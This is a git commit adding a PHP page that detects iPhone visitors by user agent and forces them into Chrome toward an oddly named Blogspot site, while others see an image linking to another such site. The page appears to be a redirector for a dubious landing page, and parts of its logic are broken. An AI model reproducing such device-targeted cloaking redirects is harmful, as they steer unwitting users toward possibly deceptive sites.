7135532205c4e1cca6a84d699bfcb6ff7bbccec0
limberlisa <54564259+limberlisa@users.noreply.github.com>
2020-01-18 12:29:05 -0400

    Add files via upload

---
+++ index.php
@@ -0,0 +1,64 @@
+<?php
+// $url = "https://trofeorsmaterilesasasa.blogspot.com/";
+// $updateGoTo = "googlechrome://navigate?url=".$url;
+
+// header(sprintf("Location: %s", $updateGoTo));
+?>
+
+<?php
+$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
+
+if ($iphone == true)
+{
+$url = "https://trofeorsmaterilesasasa.blogspot.com/";
+$updateGoTo = "googlechrome://navigate?url=".$url;
+
+header(sprintf("Location: %s", $updateGoTo));
+
+
+}else{
+
+echo '<center>';
+echo '<img style="margin-top: 45px" src="https://telegra.ph/file/2ad6bcc4826c0f41081dc.jpg" />';
+echo '</center>';
+}
+?>
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+  <head>
+  	<title>Heloos</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  </head>
+
+  <body>
+
+
+
+
+
+
+
+<center>
+<?php
+$url = "https://trofeorsmaterilesasasa.blogspot.com/";
+$updateGoTo = "googlechrome://navigate?url=".$url;
+
+ if($updateGoTo === true): ?>
+
+ 	<?php header(sprintf("Location: %s", $updateGoTo)); ?>
+
+<?php else: ?>
+
+<a href="https://tirandojordanmasterli.blogspot.com/">
+<img style="margin-top: 45px;" src="https://telegra.ph/file/2ad6bcc4826c0f41081dc.jpg" width="240" height="100">
+</a> 
+<?php endif; ?>	
+
+<!-- <a href="https://tirandojordanmasterli.blogspot.com/">
+<img style="margin-top: 45px;" src="https://telegra.ph/file/2ad6bcc4826c0f41081dc.jpg" width="240" height="100">
+</a> -->
+</center>
+     
+  </body>
+</html>
